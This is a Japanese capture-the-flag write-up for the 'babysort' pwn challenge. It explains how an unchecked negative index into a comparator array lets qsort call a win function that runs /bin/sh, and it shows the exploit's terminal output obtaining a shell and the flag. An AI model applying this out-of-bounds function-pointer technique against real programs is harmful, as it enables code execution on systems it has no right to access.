# babysort

## solution

win関数というsystem("/bin/sh")を実行する関数があるためqsort第四引数にそれを指定して呼び出す。

SortExperimentという構造体が定義されており以下のようになっている

```C
typedef int (*SORTFUNC)(const void*, const void*);

typedef struct {
  long elm[5];
  SORTFUNC cmp[2];
} SortExperiment;
```

qsortは
```C
qsort(se.elm, 5, sizeof(long), se.cmp[i]);```

のようにして実行されている。ここでiはユーザーが入力できる値であり、値のチェックも行われていない。
iに負数を指定してやると、elmを参照することができるのでelmにwinのアドレスを入力して、入力したインデックスに合うようにiの値を設定するとwin関数を呼び出すことができる。

```
$ python solve.py
[*] '/home/vagrant/interkosen2020/babysort/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './chall': pid 29496
[+] Opening connection to pwn.kosenctf.com on port 9001: Done
[*] Switching to interactive mode
[0] Ascending / [1] Descending: $ -1
$ ls
chall
flag-165fa1768a33599b04fbb4f7a05d0d26.txt
redir.sh
$ cat flag-165fa1768a33599b04fbb4f7a05d0d26.txt
KosenCTF{f4k3_p01nt3r_l34ds_u_2_w1n}
```
